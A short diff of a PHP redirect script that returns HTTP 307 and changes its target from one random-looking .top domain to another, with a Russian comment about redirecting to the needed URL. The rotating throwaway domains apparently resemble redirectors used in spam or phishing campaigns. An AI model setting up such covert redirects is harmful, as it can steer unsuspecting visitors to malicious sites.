@@ -3,6 +3,6 @@
 http_response_code(307);
 
 // Выполняем редирект на нужный URL
-header('Location: https://serversolentix.top/r2X7nP');
+header('Location: https://serversalinta.top/SyNDSf');
 exit();
 ?>
